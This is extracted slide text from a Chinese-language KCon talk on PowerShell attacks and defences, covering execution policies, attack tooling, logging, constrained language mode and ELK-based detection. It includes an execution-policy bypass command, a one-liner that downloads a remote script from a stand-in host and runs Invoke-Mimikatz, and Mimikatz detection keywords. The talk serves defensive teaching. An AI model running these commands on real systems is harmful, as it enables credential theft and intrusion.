KCon 
KCon 
Powershell攻击与防御 
360天马安全团队 王永涛(@sanr) 
Get-Host 
 360天马安全研究员
        WIFI安全
        渗透测试 
        入侵检测 
 联系方式： 
       weibo.com/0xls 
       PI:EMAIL 
       github.com/ssssanr 
CONTENTS 
PowerShell概述 
传统的powershell防御 
Powershell攻击 
PowerShell检测不防御 
%95 Powershell脚本为恶意 
PowerShell概述 
PowerShell概述 
如linux 
的Bash 
基于.Net 
技术 
WMI Log 
Registry …. 
Windows API 
.NET 
导入模块 
添加新命令 
PowerShell概述 
操作系统默认Powershell版本  $PSVersionTable 
PowerShell 
Desktop OS 
Server OS 
Version 2 
Windows 7 
Windows 2008 R2 
Version 3 
Windows 8 
Windows 2012 
Version 4 
Windows 8.1 
Windows 2012 R2 
Version 5 
Windows 10 
Windows 2016 
攻击者为什么爱PowerShell? 
白名单 
系统自带 
远程管理 
使用Windows API＆.Net代码 
内存加载 
powershell 
默认环境下的PowerShell防御 
PowerShell执行策略 
Restricted 
默认的设置， 不允许
任何脚本运行 
AllSigned 
只能运行经过数字证
书签名的脚本
Remote 
 Signed 
本地运行脚本不需要
数字签名，但运行下
载的脚本需要 
Unrestricted 
允许所有的脚本运行 
Restricted —— PS1文件丌会自动执行   默认策略禁用所有脚本执行 
PowerShell执行策略 
PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 
powershell "IEX (New-Object 
Net.WebClient).DownloadString(‘a.com/a.ps'); InvokeMimikatz 
Bypass PowerShell执行策略 
PowerShell是Windows系统的一个核心组件(且丌可移除) 
存在于 System.Management.Automation.dll 动态链接库文件(DLL) 
使用.Net就可以调用powershell 
禁止powershell有用吗？？？ 
从.Net运行powershell 
从.Net运行powershell 
Powershell攻击 
VBA  
Wmi 
HTA  
CHM 
Js/Vbs 
绕过执行策略 
多种方式调用 
Office VBA-PowerShell 
Js-PowerShell 
HTA -powershell 
CHM -powershell 
Empire 
Inveigh 
Nishang 
PowerCat 
PowerSploit 
Invoke-TheHash 
WMImplant 
OWA-Toolkit 
PowerUpSQL 
SessionGopher 
PowerShell Tools - Attack 
http://www.powershellempire.com/ 
Empire 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 
PowerSploit- PowerView 
https://github.com/fireeye/SessionGopher 
SessionGopher 
Powershell检测不防御 
Powershell 免杀 
PowerShell版本3及以上： 
>组策略 
   >计算机设置 
       >管理模板 
           >Windows组件 
  Windows powershell: 
    Module Logging （psv3） 
    Script Block Logging （psv5） 
  EncodedCommand 
  XOR, Base64, ROT13 
Powershell 日志记录 
PowerShell Module Logging 
Module Logging 
Invoke-Expression (IEX) 
Module Logging 
.Net Web Clientdownload  
Module Logging 
“mimikatz”  “gentilkiwi”  
关键词检测Invoke-Mimikatz 
System.Reflection.AssemblyName 、SE_PRIVILEGE_ENABLED、 
System.Reflection.Emit.AssemblyBuilderAccess 
关键词检测Invoke-Mimikatz 
PowerShell  Script Block Logging  
Script Block Logging 
Encoded 
Script Block Logging  Encoded 
源码混淆 日志 
FullLanguage（全语言) 
RestrictedLanguage(限制语言) 
NoLanguage (没有语言)  
ConstrainedLanguage（约束语言） 
查看语言模式  
$ExecutionContext.SessionState.LanguageMo
de 
启用约束语言模式                                                        
[Environment]::SetEnvironmentVariable('__PSL
ockdownPolicy', '4', 'Machine') 
也可以通过组策略启用：(域控) 
   计算机配置\首选项\ Windows设置\环境   
PowerShell Constrained mode 
PowerShell Constrained mode 
PowerShell Constrained mode 
ELK PowerShell 
ElasticSearch、 Logstash 、 Kibana 
Winlogbeat 、 ElasticSearch、 Kibana、 elastalert（告警） 
ELK PowerShell 
Thank 
you! 
Thank 
you!